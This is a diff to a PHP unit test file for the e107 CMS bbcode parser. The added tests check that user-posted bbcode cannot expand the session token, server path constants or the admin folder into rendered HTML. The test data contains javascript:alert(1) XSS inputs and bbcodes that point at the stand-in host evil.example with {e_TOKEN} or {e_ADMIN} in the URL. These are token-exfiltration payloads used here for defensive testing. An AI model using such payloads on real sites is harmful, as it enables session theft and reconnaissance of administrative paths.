@@ -281,7 +281,6 @@ class bbcodeAttributeInjectionTest extends \Test\Unit
 		return array(
 			'url tel'         => array('[url=tel:+15551234567]Call us[/url]', 'Call us'),
 			'file script'     => array('[file=javascript:alert(1)]notes[/file]', 'notes'),
-			'file constant'   => array('[file={e_MENU}javascript:alert(1)]notes[/file]', 'notes'),
 			'img thumbnail'   => array('[img]javascript:alert(1)//th_x.png[/img]', 'th_x.png'),
 		);
 	}
@@ -1198,6 +1197,114 @@ class bbcodeAttributeInjectionTest extends \Test\Unit
 			self::assertStringNotContainsString('="0"', $html,
 				'An [img] dimension was cast to zero: '.$bbcode.' Rendered: '.$html);
 		}
+	}
+
+	/** No CLI request mints an e-token, so the token rows render in a booted subprocess that defines this stand-in. */
+	const SESSION_TOKEN = 'e107t0ken0123456789abcdef0123456';
+
+	/**
+	 * @return array
+	 */
+	public function sessionTokenBbcodes()
+	{
+		return array(
+			'img src'   => array('[img]http://evil.example/p.png?t={e_TOKEN}[/img]'),
+			'url href'  => array('[url=http://evil.example/?u={e_TOKEN}]read[/url]'),
+			'link href' => array('[link={e_TOKEN}http://evil.example/]read[/link]'),
+		);
+	}
+
+	/**
+	 * @dataProvider sessionTokenBbcodes
+	 * @param string $bbcode
+	 */
+	public function testABbcodeDoesNotExpandTheSessionToken($bbcode)
+	{
+		list($output, $status) = $this->runInBootedCli("define('e_TOKEN', '".self::SESSION_TOKEN."'); \$tp = e107::getParser(); "
+			."echo '@@'.\$tp->toHTML(\$tp->toDB(".var_export($bbcode, true)."), true).'@@';");
+
+		$printed = implode("\n", $output);
+		$matches = array();
+
+		self::assertSame(0, $status, 'The render exited '.$status.":\n".$printed);
+		self::assertSame(1, preg_match('/@@(.*)@@/s', $printed, $matches), "The render printed no answer:\n".$printed);
+		self::assertStringNotContainsString(self::SESSION_TOKEN, $matches[1], 'A bbcode expanded {e_TOKEN} into its output: '.$matches[1]);
+		self::assertStringContainsString('e_TOKEN}', $matches[1], 'A bbcode dropped {e_TOKEN} instead of leaving it as text: '.$matches[1]);
+	}
+
+	public function testALinkStillExpandsAPathConstantInItsAddress()
+	{
+		$html = $this->renderStored('[link={e_PLUGIN}forum/forum.php]Forum[/link]');
+
+		self::assertStringContainsString("href='".e_PLUGIN."forum/forum.php'", $html, 'A path constant in a link stopped resolving: '.$html);
+	}
+
+	/**
+	 * @return array
+	 */
+	public function serverPathBbcodes()
+	{
+		return array(
+			'link href to downloads' => array('[link={e_DOWNLOAD}]files[/link]', 'e_DOWNLOAD'),
+			'url href to uploads'    => array('[url]{e_UPLOAD}[/url]', 'e_UPLOAD'),
+			'link href to system'    => array('[link={e_SYSTEM}logs/]logs[/link]', 'e_SYSTEM'),
+			'img src in downloads'   => array('[img]{e_DOWNLOAD}x.png[/img]', 'e_DOWNLOAD'),
+			'img thumbnail link to system' => array('[img]{e_SYSTEM}logs/th_x.png[/img]', 'e_SYSTEM'),
+		);
+	}
+
+	/**
+	 * @dataProvider serverPathBbcodes
+	 * @param string $bbcode
+	 * @param string $constant
+	 */
+	public function testABbcodeDoesNotExpandAServerPathConstant($bbcode, $constant)
+	{
+		$html = $this->renderStored($bbcode);
+
+		self::assertStringNotContainsString(constant($constant), $html, 'A bbcode printed the server path {'.$constant.'}: '.$html);
+		self::assertStringContainsString($constant.'}', $html, 'A bbcode dropped {'.$constant.'} instead of leaving it as text: '.$html);
+	}
+
+	/**
+	 * @return array
+	 */
+	public function adminFolderBbcodes()
+	{
+		return array(
+			'img src, forum post'    => array('[img]http://evil.example/p.png?a={e_ADMIN}[/img]', 'USER_BODY'),
+			'img src, news body'     => array('[img]http://evil.example/p.png?a={e_ADMIN}[/img]', 'BODY'),
+			'img src after a quote'  => array("[img]http://evil.example/p.png?q='&a={e_ADMIN}[/img]", 'USER_BODY'),
+			'url href'               => array('[url=http://evil.example/?a={e_ADMIN}]read[/url]', 'USER_BODY'),
+			'link href'              => array('[link=http://evil.example/?a={e_ADMIN}]read[/link]', 'USER_BODY'),
+			'flash data'             => array('[flash=50,50]http://evil.example/f.swf?a={e_ADMIN}[/flash]', 'DESCRIPTION'),
+		);
+	}
+
+	/**
+	 * @dataProvider adminFolderBbcodes
+	 * @param string $bbcode
+	 * @param string $context
+	 */
+	public function testABbcodeDoesNotCarryTheAdminFolderOfAnAdministratorReader($bbcode, $context)
+	{
+		list($output, $status) = $this->runInBootedCli("\$tp = e107::getParser(); "
+			."echo '@@'.(ADMIN ? 'admin' : 'guest').'|'.e107::getFolder('admin').'|'.\$tp->toHTML(\$tp->toDB(".var_export($bbcode, true)."), true, '".$context."').'@@';");
+
+		$printed = implode("\n", $output);
+		$matches = array();
+
+		self::assertSame(0, $status, 'The render exited '.$status.":\n".$printed);
+		self::assertSame(1, preg_match('/@@admin\|([^|]+)\|(.*)@@/s', $printed, $matches), "The render did not run as an administrator:\n".$printed);
+		self::assertStringNotContainsString($matches[1], $matches[2], 'A bbcode printed the admin folder: '.$matches[2]);
+	}
+
+	public function testAWebPathConstantAfterAQuoteStillResolvesInAPost()
+	{
+		$html = $this->tp->toHTML($this->tp->toDB("[img]{e_PLUGIN}forum/images/x.png?q='[/img]"), true, 'USER_BODY');
+
+		self::assertStringContainsString('e107_plugins/forum/images/x.png', $html, 'A web path constant after a quote stopped resolving: '.$html);
+		self::assertStringNotContainsString('&#123;e_PLUGIN', $html);
 	}
 
 	/**
